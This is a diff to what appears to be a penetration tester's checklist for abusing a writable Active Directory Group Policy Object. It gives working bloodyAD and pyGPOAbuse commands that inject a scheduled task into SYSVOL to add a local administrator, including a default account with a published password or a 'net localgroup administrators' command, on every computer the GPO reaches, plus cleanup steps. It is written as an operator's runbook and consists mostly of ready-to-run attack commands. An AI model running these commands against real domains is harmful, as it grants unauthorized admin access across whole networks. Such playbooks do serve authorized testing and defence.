@@ -5,13 +5,13 @@
 - [ ] The OUs the GPO is linked to, and the computers and users under them: that is who I hit
 At the pwn-broker prompt: tool install bloodyad.
 bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' get writable --detail
-- [ ] The GPO's displayName and its {GUID} noted: THE-GPO-NAME and THE-GPO-ID below
+- [ ] The GPO's displayName and its {GUID} noted: THE-GPO-NAME and THE-GPO-ID below, with no braces in THE-GPO-ID
 - [ ] WriteOwner or WriteDacl only, not write yet: take the rights first, as in :Pb acl-abuse
 
 ## From Kali
-pyGPOAbuse edits the GPO in SYSVOL to add an immediate scheduled task; clone it, it is not a package.
+pyGPOAbuse, from https://github.com/Hackndo/pyGPOAbuse, edits the GPO in SYSVOL to add an immediate scheduled task; clone it, it is not a package.
 python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID'
-- [ ] With no command it adds a local admin on every computer the GPO applies to
+- [ ] With no command it adds a local admin named john, with the published default password 'H4x00r123..', on every computer the GPO applies to
 python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID' -command 'net localgroup administrators <Username> /add' -taskname 'Update' -description 'Update'
 - [ ] An NT hash instead of the password: add -hashes ':<Hash>'
 
@@ -28,7 +28,8 @@ gpupdate /force
 - [ ] A computer task runs as SYSTEM at the computer's refresh; a user task waits for a logon
 
 ## Clean up and next
-- [ ] The task removed from the GPO: pyGPOAbuse leaves a ScheduledTasks.xml in SYSVOL to delete
+- [ ] The task removed from the GPO with pyGPOAbuse's --cleanup, which deletes ScheduledTasks.xml
+python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID' --cleanup
 - [ ] The local admin the task added removed once I have what I need
 - [ ] Any right or ownership I took on the GPO set back: :Pb acl-abuse
 - [ ] A new local admin on the target, used from Kali: :Pb lateral-movement
